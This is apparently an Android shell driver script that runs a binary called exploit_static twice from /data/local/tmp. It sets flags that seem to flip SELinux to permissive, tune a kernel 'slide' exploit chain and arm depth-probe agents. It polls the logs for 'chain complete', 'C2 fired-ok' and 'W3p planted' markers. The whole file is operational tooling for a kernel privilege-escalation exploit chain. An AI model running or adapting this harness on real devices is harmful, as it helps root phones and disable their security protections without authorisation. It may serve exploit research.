#!/system/bin/sh
# Driver: attempt 1 = normal chain (consumer fire) + depth-agent arms probes.
# attempt 2 = measurement run under the armed probes.
D=/data/local/tmp
cd $D || exit 1
rm -f armed_ok agent_started depth.log d1.log d2.log
rm -rf $D/dumplogs; mkdir -p $D/dumplogs

LOG=$D/d1.log
( DURABLE_LOG=$LOG FLIP_PERMISSIVE=1 NO_RSCAN=1 KSU_LOADER=0 \
  AGENT_SCRIPT=$D/arm_depth2.sh SYSCTL_WALK_ATTEMPTS=1 SLIDE_SELFCONTAINED=1 \
  SLIDE_SIGNAL_WAKE=1 SLIDE_WAIT_SECS=0 SLIDE_SIGRET_BUF_BYTE=0x10 \
  SLIDE_NO_RESTORE=1 KS_MAX_TRIES=1 SLIDE_NOKILL=1 WALK_TRACE=1 \
  ./exploit_static > /dev/null 2>&1 & )
n=0
while [ $n -lt 60 ]; do
  grep -q 'chain complete' $LOG 2>/dev/null && break
  sleep 2; n=$((n+1))
done
if ! grep -q 'chain complete' $LOG 2>/dev/null; then
  echo "ATTEMPT1-FAIL"; tail -6 $LOG 2>&1; exit 1
fi
echo "ATTEMPT1-OK"
n=0
while [ $n -lt 20 ]; do
  [ -f $D/armed_ok ] && break
  sleep 2; n=$((n+1))
done
echo "armed_ok=$(ls $D/armed_ok 2>&1)"
echo "--- arm log ---"; cat $D/dumplogs/arm_depth.out 2>&1 | tail -12
n=0
while [ $n -lt 40 ]; do
  pgrep -f 'data/local/tmp/exploit_static' >/dev/null 2>&1 || break
  sleep 2; n=$((n+1))
done
echo "procs-left=$(pgrep -f 'data/local/tmp/exploit_static' | tr '\n' ' ')"

LOG2=$D/d2.log
( DURABLE_LOG=$LOG2 FLIP_PERMISSIVE=1 NO_RSCAN=1 KSU_LOADER=0 \
  SYSCTL_WALK_ATTEMPTS=1 SLIDE_SELFCONTAINED=1 SLIDE_SIGNAL_WAKE=1 \
  SLIDE_WAIT_SECS=0 SLIDE_SIGRET_BUF_BYTE=0x10 \
  SLIDE_NO_RESTORE=1 KS_MAX_TRIES=1 SLIDE_NOKILL=1 WALK_TRACE=1 \
  ./exploit_static > /dev/null 2>&1 & )
n=0
while [ $n -lt 45 ]; do
  grep -qE 'C2 fired-ok|chain complete' $LOG2 2>/dev/null && break
  sleep 2; n=$((n+1))
done
echo "ATTEMPT2 tail:"; grep -E "W3p planted|C2 fired|chain complete" $LOG2 2>&1 | tail -6
T=/sys/kernel/tracing; [ -d "$T" ] || T=/sys/kernel/debug/tracing
true
true
echo "--- depth.log stats ---"
echo "size=$(wc -c < $D/depth.log 2>/dev/null)"
echo "rfps=$(grep -c 'rfps:' $D/depth.log 2>/dev/null) pi=$(grep -c 'pi:' $D/depth.log 2>/dev/null) sch=$(grep -c 'sch:' $D/depth.log 2>/dev/null) tick=$(grep -c 'tick:' $D/depth.log 2>/dev/null)"
echo "--- samples ---"
grep -E 'rfps:|pi:' $D/depth.log 2>/dev/null | tail -4
grep -E 'sch:|tick:' $D/depth.log 2>/dev/null | tail -3
